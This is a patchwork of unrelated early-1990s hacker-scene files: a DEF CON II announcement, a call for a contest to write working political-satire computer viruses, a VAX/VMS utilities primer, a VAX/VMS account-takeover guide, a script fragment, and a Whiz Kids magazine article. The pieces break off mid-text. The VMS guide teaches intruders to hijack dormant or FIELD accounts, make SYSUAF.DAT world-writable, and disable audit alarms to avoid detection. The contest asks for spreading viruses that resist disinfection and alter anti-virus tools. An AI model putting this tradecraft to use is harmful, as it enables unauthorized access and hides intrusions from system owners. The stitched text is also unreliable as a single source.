evil hackers to party and wreak havoc, it&#039;s just not the case.  People come
to DEF CON for information and for making contacts.  We strive to distinguish
this convention from others in that respect.

WHAT&#039;S NEW THIS YEAR:

This year will be much larger and more organized (hopefully) than last year.
We have a much larger meeting area, and have better name recognition.
Because of this we will have more speakers on broader topics.  Expect
speaking to run Saturday and Sunday, ending around 5 p.m.  Some of the new
things expected include:

&gt; An Internet connection with sixteen ports will be there, _BUT_ will only
  provide serial connections because terminals are too hard to ship.  So
  bring a laptop with communications software if you want to connect to the
  network.  Thanks to cyberlink communications for the connection.

&gt; There will be door prizes, and someone has already donated a Cell Phone
  and a few &quot;Forbidden Subjects&quot; cd ROMs to give away, thanks to Dead Addict.

&gt; Dr. Ludwig will present his virus creation awards on Sunday.

&gt; A bigger and better &quot;Spot The Fed&quot; contest, which means more shirts to
  give away.

&gt; More room, we should have tables set up for information distribution.
  If you have anything you want distributed, feel free to leave it on the
  designated tables.  Yes, this year there will be a true 24 hour
  convention space.

&gt; A 24 hour movie / video suite where we will be playing all type of stuff.
  VHS Format.  Mail me with suggested titles to show, or bring your own.
  We&#039;ll use a wall projector when not in use by speakers.

&gt; Midnight Tech Talks on Friday and Saturday night to cover the more
  technical topics and leave the days free for more general discussions.

WHO IS SPEAKING:=============================================================

This list represents almost all of the speakers verified to date.  Some
people do not want to be announced until the event for various reasons, or
are waiting for approval from employers.  A speaking schedule will go out
in the next announcement.


Philip Zimmerman, Notorious Cryptographer &amp; Author of PGP.

Dr. Ludwig, Author of &quot;The Little Black Book of Computer Viruses,&quot; and
    &quot;Computer Viruses, Artificial Life and Evolution&quot;

Loyd Blankenship (The Mentor), Net Running in the 90&#039;s and RPG.

Padgett Peterson, Computer Enthusiast, Anti-Virus Programmer.

The Jackal, A Radio Communications Overview, Digital Radio and the Hack Angle.

Judi Clark, Computer Professionals for Social Responsibility.

Gail Thackery, (Of Operation Sun Devil Fame), Topic to be Announced.

To be Announced, The Software Publishers Association, Topic to be Announced.

Toni Aimes, Ex U.S. West Cellular Fraud, Cellular Fraud Topics.

Mark Lotter, Cellular Enthusiast, Hacking Cell Phones.

Lorax, The Lighter Side of VMBs.

Peter Shipley, Unix Stud, Q&amp;A on Unix Security.

George Smith, Crypt Newsletter, Virus Topic to be Announced.

Cathy Compton, Attorney, Q&amp;A Surrounding Seizure Issues, Etc.

John Littman, Reporter and Author, Kevin Poulson, Mitnick, and Agent Steal.

Red Five &amp; Hellbender, Madmen With a Camcorder, Who Knows?

Erik Bloodaxe, Phrack Editor, Wierd Wireless Psycho Shit.. Stay Tuned..

There should be a few round table discussions on Virus, Cellular, Unix and
something else surrounding the industry.

I&#039;ll name the rest of the speakers as they confirm.  I&#039;m still working on
a few (Two?) people and groups, so hopefully things will work out and I can
pass the good news on in the next announcement, or over our List Server.

============================================================================

WHERE THIS THING IS:

It&#039;s in Las Vegas, the town that never sleeps.  Really. There are no clocks
anywhere in an attempt to lull you into believing the day never ends.  Talk
about virtual reality, this place fits the bill with no clunky hardware.  If
you have a buzz you may never know the difference.  It will be at the Sahara
Hotel.  Intel is as follows:

        The Sahara Hotel: 1.800.634.6078

        Room Rates: Single/Double $55, Triple $65, Suite $120
                    (Usually $200) + 8% tax

        Transportation: Shuttles from the airport for cheap.

   NOTE:  Please make it clear you are registering for the DEF CON II
   convention to get the room rates.  Our convention space price is
   based on how many people register.  Register under a false name if
   it makes you feel better, &#039;cuz the more that register the better for
   my pocket book.  No one under 21 can rent a room by themselves, so
   get your buddy who is 21 to rent for you and crash out.  Try to contact
   people on the Interactive Mailing List (More on that below) and
   hook up with people.  Don&#039;t let the hotel people get their hands on
   your baggage, or there is a mandatory $3 group baggage fee.  Vegas
   has killer unions.

OTHER STUFF:

I&#039;ll whip up a list of stuff that&#039;s cool to check out in town there so if for
some reason you leave the awesome conference you can take in some unreal
sites in the city of true capitalism.  If anyone lives in Las Vegas, I
would appreciate it if you could send a list of some cool places to check out
or where to go to see the best shows and I&#039;ll post it in the next
announcement or in the program

-&gt; I am asking for people to submit to me any artwork, pictures, drawings,
   logos, etc. that they want me to try and include in this years program.
   I am trying to not violate any copyright laws, but want cool shit.  Send
   me your art or whatever and I&#039;ll try and use it in the program, giving you
   credit for the work, of course.  Please send it in .TIF format if it has
   more than eight bit color.  The program will be eight bit black and white,
-&gt; in case you want to make adjustments on your side.


PLEASE DONATE &quot;STUFF&quot; FOR THE GIVEAWAY:

    We are trying to raffle off interesting and old functional items.  If
you have anything such as old computers, modems, weird radio stuff, books,
magazines, etc that you want to get rid of, please call or mail me with
what it is, or bring it along.  I don&#039;t want to waste peoples time giving
away rubber bands or anything, but pretty much anything else will go.

*** NEW MAILING LIST SERVER ***

We&#039;ve finally gotten Major Domo List Serv software working (Kinda) and it
is now ready for testing.  MTV spent a lot of time hacking this thing to work
with BSDi, and I would like to thank him.  The purpose of the list is to
allow people interested in DEF CON II to chat with one another.  It would
be very useful for people over 21 who want to rent hotel space, but split
costs with others.  Just mention you have room for &#039;x&#039; number of people, and
I&#039;m sure you&#039;ll get a response from someone wanting to split costs.  Someone
also suggested that people could organize a massive car caravan from Southern
Ca. to the Con.  My attitude is that the list is what you make of it.  Here
are the specifics:

Umm.. I TAKE THAT BACK!!  The mailing list is _NOT_ ready yet.  Due to
technical problems, etc.  I&#039;ll do another mass mailing to everyone letting
them know that the list is up and how to access it.  Sorry for the delay!


MEDIA:

Some of the places you can look for information from last year include:

New Media Magazine, September 1993
InfoWorld, 7-12-1993 and also 7-19-1993 by Robert X. Cringely
Gray Areas Magazine, Vol 2, #3 (Fall 1993)
Unix World, ???,
Phrack #44, #45

COST:

Cost is whatever you pay for a hotel room split however many ways, plus
$15 if you preregister, or $30 at the door.  This gets you a nifty 24 bit
color name tag (We&#039;re gonna make it niftier this year) and your foot in the
door.  There are fast food places all over, and there is alcohol all over
the place but the trick is to get it during a happy hour for maximum
cheapness.

         *************************************************************

                                    Details

         *************************************************************

The philosopher Friedrik Nietzsche once said that if you want to kill
something, you must laugh at it--and laugh at it deeply. So there should be
little wonder that political satire is as old as politics itself.

Is there something going on in the political arena that you abhor, that makes
you sick, that is just plain wrong? Well, here&#039;s your chance to make a
mockery of it. I&#039;ve always had this idea that if someone wrote a sufficiently
witty virus that really addressed the issues the way the people (not the
press, not the politicians) saw them, it might just get passed around by
people voluntarily.

Let&#039;s find out.

Write a virus that is itself a political satire. I don&#039;t mean a virus that
simply displays a message. I mean a living entity whose every move--whose
every action--is politically motivated. If you need more than one virus to
make your point--perhaps two viruses working together, or something like that,
that is fine.

         -----------------------------------------------------------
Let me give you a simple example: The Political Correctness Virus

This virus is a spoof on the &quot;political correctness&quot; movement--which is just
a form of self-imposed censorship--that is sweeping American intellectual
circles, particularly colleges and universities.

This virus is a memory resident boot sector virus which maintains a list of
politically incorrect words on your computer system. It also hooks the
keyboard interrupt and monitors every keystroke you make. If you type a
politically incorrect word into the computer, the PCV springs into action.

Politically incorrect words are ranked at three different offense levels.
When the PCV encounters such a word, it determines what offense level that
word is, and acts accordingly.

The least offensive words merely register a beep. More offensive words cause
a beep to sound for 10 seconds. The most offensive words cause a siren to
sound for two minutes, locking the system for that duration. If you turn the
computer off before the two minutes are up, the virus will stop the boot
process for five minutes, with sirens, when you turn it back on. If you allow
the siren to complete, then you can proceed.

The virus has two different word lists, both stored in an encrypted and
compressed format. The list is selected at random when the system is
infected, after which it cannot be changed. The first list is the &quot;proper&quot;
list of political correctness no-no&#039;s. For example, a word like &quot;sodomite&quot; is
among the worst possible offenses. The second list is an inverted list of
no-no&#039;s.  This list trys to force you to use &quot;sodomite&quot; by flagging words
like &quot;gay&quot; and &quot;homosexual&quot; as no-no&#039;s.

If you allow the PCV to live in your system for three months without getting
a single flag, you are given the supreme honor of viewing the word list
assigned to you and adding a word to it. If you get more than 3000 flags in
a lifetime, the virus will force you to enter a politically correct word
before allowing you to start the computer, since you are obviously unwilling
to submit to its censorship.

The virus also uses powerful means to prevent disinfection, so that, once you
get it, you can&#039;t get rid of it without a major effort.

         ------------------------------------------------------------

Now, I know you can get a lot more creative than this--so do it! Design your
virus carefully, so that everything it does has meaning. Then send it in.

Here are the criteria we&#039;ll use:

1. Originality: Your virus must be an original work. Do not send us anything
that is not 100% yours. Your message should be original too. Do not just
ape what everybody else is saying, especially the media. Also, a refined wit
is much to be preferred over vulgarity. Vulgarity is a substitute for
original wit. Foul language, porn, etc., are out. Destructive features should
be incorporated only if they are VERY appropriate (perhaps if you are
commenting on real live genocide in your country, or something like that).
In general, though, destructive features will hurt you, not help you. The one
exception is modifying anti-virus programs. That is considered to be
CONstructive activity.

2. Creativity: Make us laugh, make us cry. Amaze us with how bits and bytes
can say something about politics and issues.  Think of it like this:
displaying a message on the screen is like reading a text file. What we want
is the equivalent of a multi-media extravaganza. Use all the system&#039;s
resources to tell your message. Don&#039;t be afraid to write a virus that has
some weird mode of infecting programs that tells a story, or to write one
that sends faxes to the White House, or sends an automatic request for reams
of free information to some government agency.

3. Functionality: The virus has to work. If it only works on some machines,
or under some versions of DOS, or what-not, then that will count against
you. The better it is at infecting systems and moving around, the better off
you will be. So, for example, if you write a file-infector, make sure it can
jump directories, and--if you&#039;re up to it--migrate across a network.

4. Political incorrectness: Since computer viruses are politically incorrect,
their message should be too. If you send us a pro-establishment virus, then
you will not win this contest. A word to the wise: think twice about what&#039;s
correct and what&#039;s not. Many positions are only superficially incorrect,
though they are really quite fashionable among the establishment. Look at it
this way: if you could get a well-written letter expressing your view
published in a big city newspaper, then it&#039;s not sufficiently incorrect.
There are a LOT of ideas that are unofficially censored by society--
especially the media and academia. They tend to make themselves out to be the
rebels, but they are really the establishment. If you can&#039;t think of anything
creatively incorrect and sufficiently obnoxious then you shouldn&#039;t be writing
viruses in the first place.

                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                        Some Helpful VAX/VMS utilities

                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Introduction :
^^^^^^^^^^^^
This article contains a brief introduction to some not so often used
utilities, found on the Virtual Address eXtentions/ Virtual Memory System or
better known to us as the VAX/VMS.

Please note that this file is meant for the so called VMS &quot;newbies&quot;. It gives
an insight to the processes that are running in the different &quot;Hibernation&quot;
states on VMS, quite similar to the background processes running on UNIX and
its clones. If you have &quot;extensive&quot; experience on VMS as a systems programmer
or a SysOp, you might want to skip it !!

Portions of this file are taken from the ever blabbering VMS HELP, which is
where many of us, myself included, learn about the VAX/VMS. VMS has lots of
secrets. Locations of &quot;hidden&quot; files are a very well kept secret, known
not even to the SysOp but only to the system programmer.

Ok.... Lets get started...


SHOW SYSTEM   :
^^^^^^^^^^^
This command ($Show system) will display information about the
status of the processes running on the system.
There are various options to this command, some of which are listed below.


    /BATCH     /CLUSTER   /FULL      /NETWORK   /NODE      /OUTPUT
    /PROCESS   /SUBPROCESS

           The information in this example includes the following:

            o Process identification (PID) code-A 32-bit binary value that
              uniquely identifies a process.

            o Process name-A 1- to 15-character string used to identify a
              process.

            o Process state-The activity level of the process, such as COM
              (computing), HIB (hibernation), LEF (local event flag) wait,
              or CUR (if the process is current). If a multiprocessing
              environment exists, the display shows the CPU ID of the
              processor on which any current process is executing.

              Note that the SHOW SYSTEM command examines the processes on
              the system without stopping activity on the system. In this
              example process information changed during the time that the
              SHOW SYSTEM command collected the data to be displayed. As
              a result, this display includes two processes, named GAWAIN
              and S. Whiplash, with the state CUR on the same CPU, CPU ID
              6 in the example.

            o Current priority-The priority level assigned to the process
              (the higher the number, the higher the priority).

            o Total process I/O count-The number of I/O operations
              involved in executing the process. This consists of both
              the direct I/O count and the buffered I/O count.

            o Charged CPU time-The amount of CPU time that a process has
              used thus far.

            o Number of page faults-The number of exceptions generated by
              references to pages that are not in the process&#039;s working
              set.

            o Physical memory occupied-The amount of space in physical
              memory that the process is currently occupying.

            o Process indicator-Letter B indicates a batch job; letter
              S indicates a subprocess; letter N indicates a network
              process.

            o User identification code (UIC)-An 8-digit octal number
              assigned to a process. This number is displayed only if the
              /FULL qualifier is specified.

   So now that we beat the SHOW SYSTEM command to death, lets take on another
   command. Hmmm..let&#039;s see..Ahhhaaaa the MONITOR SYSTEM !!!!!

   This is a pretty neat command and one of my favorite &quot;play&quot; commands. Don&#039;t
   get me wrong, there&#039;s a lot to be learned from &quot;play&quot; commands like these.
   It really gives us some useful information. The reason why I like this
   utility is because it gives a GRAPHICAL representation of the
   data given by the SHOW SYSTEM. I would have included a short example
   of the graphics, but not everyone receiving this article would be running
   VMS on a terminal with ANSI emulation. So, if you want to see the ANSI
   graphics, follow my instructions...


MONITOR

   Invokes  the  VMS  Monitor  Utility  (MONITOR)  to  monitor  classes  of
   system-wide  performance  data   at  a  specified  interval.  It produces
   three types of optional output:

      o  Recording file
      o  Statistical terminal display
      o  Statistical summary file

   You  can collect data from a running system or from a previously created
   recording file.

   You can execute a single  MONITOR request,  or enter MONITOR interactive
   mode to execute a series of requests.  Interactive mode is entered  when
   the MONITOR command is issued with no parameters or qualifiers.

   A MONITOR request can be terminated by pressing CTRL/C or CTRL/Z. CTRL/C
   causes MONITOR to enter interactive mode; CTRL/Z returns to DCL.


   The  MONITOR  Utility  is described in detail in the VMS Monitor Utility
   Manual.

   Format:
          MONITOR  class-name[,...]

   There are quite a few different options available for the MONITOR utility.
   We are not going to get into too much detail about each option, but I will
   take the time to discuss a few. The different options for MONITOR are....

                        VAX/VMS AUTHORIZATION SYSTEM
                        ----------------------------

Introduction:
------------

Well, since Phrack issues containing VMS articles are pretty rare I will
examine in deep the authorization sub-system on VAXes.

Keep in mind that I will take under consideration that you are probably
under some new VMS version (5.5-X). If you are on some older VMS, don&#039;t
worry, commands are the same, just some flags and display was added on
later versions.  The knowledge of the authorization sub-system is of great
importance for a VAX hacker since he must keep himself an access to the
system, and this is the right way to do it.

Also keep in mind that this is just a practical guide oriented to a hacker&#039;s
needs and was done to be understandable by and useable by everybody,
even those who are not so familiar with VMS. That&#039;s why I included some
references to VMS filesystem, privileges, etc.

AUTHORIZE:
---------

The authorization subsystem is the one that will let you create accounts
under the VMS operating system. The command you need to execute is the:

                        SYS$SYSTEM:AUTHORIZE.EXE

What do you need to execute that program ?

                        READ/WRITE PRIVS over SYSUAF.DAT
                        EXECUTE PRIVS    over SYS$SYSTEM:AUTHORIZE.EXE

How can you check if you got all needed to start creating accounts ?

DIR SYS$SYSTEM:AUTHORIZE.EXE/FULL

Directory SYS$SYSROOT:[SYSEXE] &lt;----- Directory you are listing

AUTHORIZE.EXE;1               File ID:  (2491,5,0)
Size:          164/165        Owner:    [SYSTEM] &lt;---- Owner is Sys Manager
Created:  20-JUL-1990 08:30:34.18  &lt;------- Creation Date of program

                    No version limit, Contiguous best try

Record attributes:  None
RMS attributes:     None
Journaling enabled: None
File protection:    System:RWED, Owner:RWED, Group:R, World: &lt;---- (*)
Access Cntrl List:  None
Total of 1 file, 164/165 blocks.

(*) This is the field that will tell if you are authorized to execute the
    program. In this case if you own a privileged account you
    can run it. That doesn&#039;t mean that you will be able to view/modify
    any account found on the SYSUAF.DAT. But 95 % of the time any user
    can execute the AUTHORIZE program even if you don&#039;t have READ privilege
    on the SYS$SYSTEM directory. That means that if you do a :

    DIR SYS$SYSTEM

    and you find that you don&#039;t have the privilege to view the files contained
    in that directory you may still be able to execute the AUTHORIZATION
    subsystem, of course, you have a real low chance of getting the SYSUAF.DAT
    read or modified.

If you find that the authorize program cannot be executed a good method is
to send it UUENCODED from another VAX where you *DO* have at least read access
to SYS$SYSTEM:AUTHORIZE.EXE . If you are working on the X-25&#039;s you can send
it via PSI mailing. If you are on the Internet, just send it using the
normal mail routing method to the user on the VAX you want the AUTHORIZE.EXE
to get executed by.  Once you get it just UUDECODE it and place it in your
SYS$LOGIN directory and execute it!.

The authorize will work as a module, and won&#039;t try to overlay any other module
to make it work correctly.  If you can run the authorize you should receive :

&quot;UAF&gt;&quot; prompt.

THE SYSUAF.DAT:
--------------

The SYSUAF.DAT is the most important file of the authorization subsystem.
All the accounts are stored here with their :

        - PASSWORDS     (encrypted)
        - ENVIRONMENT
        - DIR
        - privileges
        - RIGHTS OVER THE FILES
        ... and more

The SYSUAF.DAT is somehow like the /etc/passwd file on Unix OS.
Under UNIX you can take the password file and with an editor add yourself
an account or modify an existing one without problem. Well this is not
possible under VMS. You need a program that knows SYSUAF.DAT record structure
(like AUTHORIZE) to take action over accounting system.

The main difference is that the SYSUAF.DAT is not a PLAIN TEXT FILE, its
a binary file structured to be read only by the AUTHORIZE program.
Another main difference is that is not world readable, can usually be only
read from high privileged accounts or from accounts which can override
system protection flags (will talk about this later).

The SYSUAF.DAT can be found in the same directory as the AUTHORIZE.EXE
program, the SYS$SYSTEM. You will usually find a few versions of this file
but normally with the same protections as the working one.
What can be interesting is that you can usually find files produced by the
output of the LIST command (under AUTHORIZE) which can be WORLD readable where
you will have all the accounts listed with the OWNER/DIR/PRIVS..etc. That will
help you a lot to try to hack some accounts if you still can&#039;t run authorize.
Those files are called normally: SYSUAF.LIS, and you might find more than
just one of them. Of course try to get the latest one since the older
ones will contain some expired/deleted accounts.

To check what privilege you have over the SYSUAF.DAT issue :

DIR SYS$SYSTEM:SYSUAF.DAT/FULL

Directory SYS$COMMON:[SYSEXE]
SYSUAF.DAT;1                  File ID:  (228,1,0)
Size:          183/183        Owner:    [SYSTEM]
Created:  20-JUL-1990 08:30:21.50
Revised:  14-JAN-1994 03:33:27.75 (34812) &lt;--- Last Creation/Modification
Expires:   &lt;None specified&gt;
Backup:    &lt;No backup recorded&gt;
File organization:  Indexed, Prolog: 3, Using 4 keys
                             In 3 areas
File attributes:    Allocation: 183, Extend: 3, Maximum bucket size: 3
                    Global buffer count: 0, No version limit
                    Contiguous best try
Record format:      Variable length, maximum 1412 bytes
Record attributes:  None
RMS attributes:     None
Journaling enabled: None
File protection:    System:RWED, Owner:RWED, Group:R, World: (*)
Access Cntrl List:  None

Total of 1 file, 183/183 blocks.

In this case, if you are under a standard user account you won&#039;t be
able to READ or/and WRITE the SYSUAF.DAT.  So when you will execute the
AUTHORIZE program, it will quit and kick you back to shell.
IF you have World : R, you will be able to  LIST/SHOW     accounts.
IF you have World : RW, you will be able to CREATE/MODIFY accounts.

But if you happen to have SYSPRIV you will be able CREATE/MODIFY the
SYSUAF.DAT at your pleasure!  Since you can override the system protection
that has been imposed over that file.  Of course, if you have SETPRV
privilege you have ALL privilege, and you can do whatever you want
with the VAX.

Privileges needed to CREATE/MODIFY accounts :

Process privileges:
*SETPRV               may set any privilege bit
Explanation: With this only you can assign yourself all the privileges you
need with a SET PROC/PRIVS=ALL.

*SYSPRV               may access objects via system protection
Explanation: If you have this one you will be able to read the SYSUAF.DAT.

*BYPASS               may bypass all object access controls
Explanation: If you have this one you can read the SYSUAF.DAT since
all the objects (ie:files) will be made accessible to you. I suggest that
if you happen to have some problems, change the files access flags to
let it be WORLD (you) readable/writable. So use :

                 SET FILE/PROT=(w:rwed) SYS$SYSTEM:SYSUAF.DAT

*READALL              may read anything as the owner
Explanation:  Well this is obvious, SYSUAF.DAT will be read without problems
but of course you won&#039;t be able to CREATE/MODIFY accounts to your pleasure.
At least you can LIST/SHOW all the accounts as deep as you want.

Entering AUTHORIZE:
------------------
Once you&#039;ve executed AUTHORIZE you will receive its main prompt:

RUN SYS$SYSTEM:AUTHORIZE

UAF&gt;

UAF stands for User Authorization File.

First of all you will first need to get a list of all the accounts on the
system with some of their settings also. To do this issue the command:

UAF&gt;SHOW USERS/BRIEF

       Owner         Username           UIC       Account  Privs Pri Directory

ALLIN1V24CREATED     A1$XFER_IN      [660,1]               Normal  4 Disuser
ALLIN1V24CREATED     A1$XFER_OUT     [660,2]               Normal  4 Disuser
JOHN_FAVORITE        JFAVORITE       [300,2]      LEDGER   Devour  4 DEV$DUA2
:[ABDURAHMAN]

IBRAHIM ALBHIR       ALBHIR           [60,111]    GOTVOT   Normal  4 DUA2:[ALB
HIR]

ALGHAMDI             ALGHAMDI        [300,1]      LEDGER   Normal  4 DUA2:[ALG
HAMDI]

ALHAJAJ              ALHAJAJ         [325,3]      BUDGET   Devour  4 GOTDEV$DU
A2

Explanation:

1) Owner: Owner of the account

2) Username: This is the guy&#039;s login name

3) UIC: User Identification Code. This serves to the OS to recognize you and
        rights you have over files, directory, etc.

4) Account: This is to let the operator know what the group is
            that owns/manages the account.

5) Pri: don&#039;t worry about it.

6) Directory: This is the account HOME directory. Where the owner of the
              account will work on.

After you have captured the output of the SHOW command you can start
trying to create yourself some accounts by modifying some already existing
ones (which I suggest strongly).

To create an account issue the following command :

CREATE JOHN/DIR=JOHNS_DIR/DEVICE=SYS$USER/PASSWORD=JOHNS_PASSWORD
/ACCESS=(DIALUP,NETWORK)/PRIVS=(NETMBX,TMPMBX)/DEFPRIVS=(NETMBX,TMPMBX)
/ACCOUNT=USERS/OWNER=JOHN

Effects of this command:

Will create a user called JOHN which will log under the JOHNS_DIR directory,
who will have just normal user privileges (TMPMBX/NETMBX) who, when listed,
will appear to be as part of the group name USERS and the account&#039;s owner
will be JOHN.

After you issue this command a NEW UIC will be added to the RIGHTSLIST.DAT
file being assigned to your user.

Explanation:

DIR: can be any directory name you saw on the system. Of course if you are
not using all the privileges, check that its READ/WRITE-able
so you won&#039;t have problems at login.

DEVICE: is where the DIR can be found. That means that you have to tell in
which physical/logical device that directory will be found. Since VAXes will
have at least 1 or 2 magnetic supports you must say on which one the directory
can be found. Normally they already have some logical names assigned like
SYS$USER,SYS$SYSTEM,SYS$SPECIFIC,SYS$MANAGER, etc.

PASSWORD: is the password you want for the account which will never be shown
to anyone, so use whatever one you like.

ACCESS: tells the system from where you will authorize logins for this
account. For example I&#039;m sure you&#039;ve seen this message:

Username: BACKUP
Password:
Cannot login from this source.

Well this is the result of an account being setup with the DIALUP flags in
the access field as NODIALUP.

So if u want to give the account all kind of access just use :
ACCESS=ALL

and this will authorize all login sources for the account.

PRIVS: will setup the privileges on the named account. If you just want it
to be a normal user account use TMPMBX,NETMBX.  If you want it to be
a super-user account you can use ALL. But this is not the right way
if you don&#039;t want your account to get discovered fast.

 READALL              may read anything as the owner
 SECURITY             may perform security functions

Check the last section on tips on creating accounts.

ACCOUNT: this is pretty useless and is just for displaying purposes at the
SHOW USER under authorize.

OWNER: This field is also used just at SHOW time but keep in mind to use
an owner that won&#039;t catch the eye of the system manager.

You can use the MODIFY command the ame as you used the CREATE. The only
difference is that no account will be created but ALL types of modifications
will affect the specified account.

You can use the LIST command to produce an output of the accounts to a file.
Use this command as you use the SHOW one.

Of course, the authorize sub-system is so huge you can actually set hours of
login for users, expirations, disk quotas, etc., but this is not the purpose
of this article.

Tips to create accounts:
-----------------------
First of all, what I suggest strongly is to MODIFY accounts not to CREATE
new ones. Why this?  Well, new account names can jump out at the operator
and he will kick you off the system very soon.

The best way I think is to get a non-used account, change its privileges
and change the password and use it!.

First of all try to find a never-logged account or at least one account
whose last log comes from few months ago. From the UAF prompt just
do a SH USER/FULL and check out the dates that appear in the *Last Login*
record. If this happens to be a very old one then it can be marked as
valid to take control of. Of course you have to find a non used account
since you will have to change the account&#039;s password.

Check the flags field also. This flags can really bother you:

                            Captive     (worst one!)
                            Ctly        (ctrl-y deactivated)
                            Restricted  (OS does more checks than normal)
                            DisUser     (ACCOUNT IS NOT ENABLED!!!)

I suggest you take out all the flag&#039;s fields.
just issue: MODIFY JOHN/FLAGS=(NOCAPTIVE,NOCTLY,NORESTRICED,NODISUSER)
If you find an account that is DisUser I suggest not to own it since the
DisUser flags will take on when listing the accounts. If system manager
sees an account that was OFF now ON..well it&#039;s a bit suspicious don&#039;t
you think ?

Check if the FIELD account is being used. If not own this one since it
already has ALL privileges and will not look suspicious at all. Just change
its password.  (FIELD is the account normally used by Digital Engineers
to check the VAX).

Remember to check also that DIALUP access is permitted or you won&#039;t be able
to login your account.

Once you&#039;ve chosen the perfect account you can now change its password.
Issue: MODIFY JOHN/PASSWORD=MY_PASSWORD. (John is the account name you found)

After you finished just type CTRL-Z and to exit. If you happen to logoff
without exiting AUTHORIZE, don&#039;t worry.  Changes to SYSUAF.DAT are done
instantly when the command finishes its execution.

One other advice, under SHELL if you happen to have SECURITY privilege
Issue: SET AUDIT/ALARM/DISABLE=(AUTHORIZE)

If you don&#039;t do this, each time you run AUTHORIZE, modified accounts will be
logged into OPERATOR.LOG so remember to do so.

After playing a bit with AUTHORIZE you won&#039;t have much problems understanding
it. Hope you have PHUN! ;-)

$ ! Remember to add the files the program requires, such as:                   !
$ ! INVI.EXE                                                                   !

$ ! And remember to create the subdirectories the program requires, AND to     !
$ ! create a [bbs] directory, otherwise to rename [bbs] string, in this        !
$ ! program, to a different name.                                              !
$ !                                                                            !
$ ! I am sorry if program documentation is poor, but this program is mainly    !
$ ! intended as a skeleton for future developments.                            !
$ ! I swear next time it will came up with a installation.com file :)          !
$ !                                                                            !

Hollywood-Style Bits and Bytes

Whiz Kids&#039; Executive Producer Phil DeGuere Takes You Behind the Scenes
of His Hit TV Series

by Richard Goodwin

&quot;I want to overcome what appears to be peoples&#039; innate fear of computers
at an early age to that they won&#039;t have any fear nor will be
particularly in awe of them,&quot; says Executive Producer Phil DeGuere of
his new TV series &quot;Whiz Kids.&quot;

At the time he was speaking, it was January and CBS had just given him
the go-ahead to prepare a pilot.  After the pilot was delivered in
April, the network gave him a series commitment to produce the
successive episodes.

It wasn&#039;t until this past June that &quot;WarGames&quot; opened and DeGuere, who
wasn&#039;t overly thrilled with the summer smash, goes to great length to
make people aware that there are no similarities.  In fact, he says, the
idea was hatched more like a year-and-a-half ago, before WarGames even
went into production.  DeGuere, a large, slightly rumpled appearing
Californian, is one of Universal&#039;s most successful television producers.
He has been with the giant studio for nearly a decade and has had a
string of popular series including &quot;Baa Baa Black Sheep&quot; and the
current hit, &quot;Simon and Simon.&quot;  A long time fan of science fiction,
DeGuere feels the new series, now seen on Wednesday evenings is living
up to the original meaning of science fiction.  He&#039;s taking today&#039;s
technology and expanding upon it in fictionalized settings.

&quot;The important thing is versilitude and not accuracy,&quot; he says while
seated in his large office.  &quot;You should feel when watching it that it&#039;s
the real thing.  I think we&#039;ve succeeded in that because consistently,
computer professionals have enjoyed the pilot and even though they know
better than anybody that there are impossible things being done in that
pilot.  It&#039;s not like having a Volkswagon fly...it&#039;s not that
impossible.&quot;

Computer fans will find many identifiable machines on the show with
most of the major companies represented in one way or another.  &quot;I&#039;ve
got to differentiate between what are essentially props on the one hand
and working gadgets on the other,&quot; DeGuere explains.  &quot;In terms of
props, you&#039;re going to see things like Apples and Ataris.  We have been
using some Aquariuses from Mattel and if Coleco ever comes up with ADAM,
I&#039;m sure we&#039;ll use that too.

&quot;On the higher tech side, we&#039;ll have some of the hot portable computers
like Gavilan and Compass, all of which basically are things people sit
at.  There may not be any systems functioning during the course of the
show.

&quot;When it comes to real working gadgets, it appears that we have
worked out an arrangement with Xerox to use what is probably the most
sophisticated personal computer in existence, the Xerox 1100, which is
such an expensive machine and was responsible for some super-high
resolution graphics in the pilot.  After some modifications to the
machine it will be capable of generating some great graphic material.&quot;

DeGuere shifts a bit in his chair, runs a hand through his tousled hair
and adds, &quot;We&#039;re into some robots.  We&#039;re using one called RB5.  They&#039;re
pretty amazing machines.  RB5 is like an R2D2.  We&#039;re planning to
incorporate it into some classroom situations.&quot;

The computer whiz and focal point of the series centers around Richie,
the &quot;hacker&quot; played by Matthew Laborteaux.  He&#039;s surrounded by three
friends with varying degrees of interest in computers but all love the
adventures.  There&#039;s Hamilton Parker (Todd Porter), the freshman class
president; Jeremy (Jeffrey Jacquet), the resident jock and Alice (Andrea
Elson) who wants to belong to the gang.  Richie is also forced to deal
with a younger sister (Melanie Gaffin) who wants to be in on the action
but is either too scared or perhaps intimidated a bit by Richie.

The youngsters go to a progressive California high school with a full
complement of computers and an exasperated teacher who is always bested
by Richie.  When danger lurks, though, the kids turn to Farley (Max
Gail, best remembered as Wojo on &quot;Barney Miller&quot;), the crime reporter
for the local paper.

Originally, the kids were teamed with a younger reporter, but CBS
decided a more adult, experienced role model was needed to offset the
youthful exuberance of the stars.  Also representing the adult world is
a cop named Quinn, played by A. Martinez.  And to keep things
interesting, the cool and dapper Quinn dislikes Farley, a Damon
Runyeonesque-type of guy.

As seen in the pilot, the adults do not appear to be the brightest of
people and DeGuere explains it&#039;s done on purpose.  The focus of the
show is on the kids.  We want them, the underdogs, to succeed.  In order
for that to happen the adults have to tune them out,&quot; he defends.  The
first story has Richie and the gang bringing down an overambitious
vice-president of a mammoth conglomerate.  They story, while amusing,
raised the ire of critics by the cavalier actions of the kids.

At a promotional meeting held early this summer, DeGuere defended his
show with characteristic bluntness.  &quot;I insulted them personally and I
insulted their family and I insulted their heritage, their future
generations, their profession and just about anything else I could think
up.  The major attention being an attempt to get them off this idea that
they have uncovered some horrible sin.  I think we were very successful
in doing that.&quot;

DeGuere says his series won&#039;t show the kids breaking into computers and
invading peoples&#039; privacy.  Rather, the repercussions of such actions
will form the core of some segments.  &quot;We were responsible on those
subjects from the very beginning,&quot; he points out.  &quot;There is something
synergistic about a computer program.  A computer program does things
that a computer designer does not always intend.  Even if you sat down
from scratch.  If the armed forces came to you and said, &#039;Here&#039;s all the
money and time in the world.  You&#039;re going to start from scratch with
the hardware and software.  Build us a network that is totally secure.&#039;
I don&#039;t think it could be done.  That&#039;s one of the things that&#039;s so
fascinating about computers--the program ends up being more than the sum
of its parts.  Even though, in most states, there are statutes which
state that accessing another computer system without permission is
against the law.&quot;

&quot;Whiz Kids&quot; will benefit from the experience of two consultants, adding
a level of technical accuracy other films and television programs have
missed.  David Gunn worked on the pilot and was signed on by DeGuere for
the duration of the series.  &quot;He&#039;s very knowledgeable in the field of
